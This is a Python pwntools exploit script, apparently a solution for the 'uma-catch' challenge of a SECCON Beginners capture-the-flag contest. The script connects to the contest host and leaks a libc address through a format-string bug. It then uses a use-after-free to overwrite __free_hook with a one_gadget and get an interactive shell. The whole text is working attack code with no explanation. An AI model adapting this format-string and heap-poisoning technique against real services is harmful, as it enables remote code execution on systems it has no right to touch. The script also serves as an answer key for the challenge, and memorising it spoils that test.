from pwn import *
elf = ELF("./chall")
context.binary = elf
libc = ELF("./libc-2.27.so")

#s = process('./chall')
s = remote('uma-catch.quals.beginners.seccon.jp', 4101)


def catch(index):
    s.sendlineafter('> ', '1')
    s.sendlineafter('> ', str(index))
    s.sendlineafter('> ', 'bay')

def naming(index, name):
    s.sendlineafter('> ', '2')
    s.sendlineafter('> ', str(index))
    s.sendlineafter('> ', name)

def show(index):
    s.sendlineafter('> ', '3')
    s.sendlineafter('> ', str(index))
    return s.recvline()[:-1]

def release(index):
    s.sendlineafter('> ', '5')
    s.sendlineafter('> ', str(index))

# libc leak
catch(0)
naming(0, '%{}$p'.format(11))
__libc_start_main_ret = int(show(0).strip(), 16) - 231
libc_base = __libc_start_main_ret - libc.symbols.__libc_start_main
print('libcbase:', hex(libc_base))
libc.address = libc_base
print('__free_hook:', hex(libc.symbols.__free_hook))

one_gadget = libc_base + 0x4f432

release(0)
naming(0, p64(libc.symbols.__free_hook))
catch(0)
catch(0)
naming(0, p64(one_gadget))
release(0)

s.interactive()

